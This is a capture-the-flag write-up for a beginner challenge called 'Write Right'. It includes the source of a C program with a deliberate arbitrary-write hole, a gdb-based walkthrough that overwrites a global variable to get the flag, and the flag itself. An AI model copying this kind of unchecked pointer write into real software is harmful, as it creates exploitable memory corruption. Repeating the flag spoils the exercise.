# Write Right - 50

```
Can you change the secret? The binary can be found at /home/write_right/ on the shell server. The source can be found here.
```
Source:

```
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

unsigned secret = 0xdeadbeef;

int main(int argc, char **argv){
    unsigned *ptr;
    unsigned value;

    char key[33];
    FILE *f;

    printf("Welcome! I will grant you one arbitrary write!\n");
    printf("Where do you want to write to? ");
    scanf("%p", &ptr);
    printf("Okay! What do you want to write there? ");
    scanf("%p", (void **)&value);

    printf("Writing %p to %p...\n", (void *)value, (void *)ptr);
    *ptr = value;
    printf("Value written!\n");

    if (secret == 0x1337beef){
        printf("Woah! You changed my secret!\n");
        printf("I guess this means you get a flag now...\n");

        f = fopen("flag.txt", "r");
        fgets(key, 32, f);
        fclose(f);
        puts(key);

        exit(0);
    }

    printf("My secret is still safe! Sorry.\n");
}
```

Few things to note:
* it grants the arbitrary write
* secret is global variable
* we need to wrtie 0x1337beef to secret to get the flag

So:

```
pico15664@shell:/home/write_right$ gdb -q write_right

-q option suppresses the gdb version and stuff

(gdb)p &secret
$1 = (<data variable, no debug info> *) 0x804a03c <secret>
(gdb) q

pico15664@shell:/home/write_right$./write_right
Welcome! I will gran you one arbitrary write!
Where do you want to write to? 0x804a03c
Okay! What do you want to write there?0x1337beef
Writing 0x1337beef to 0x804a03c...
Value written!
Woah! You changed my secret!
I guess this means you get a flag now...
arbitrary_write_is_always_right
```

And there is our flag:

```
Flag: arbitrary_write_is_always_right
```



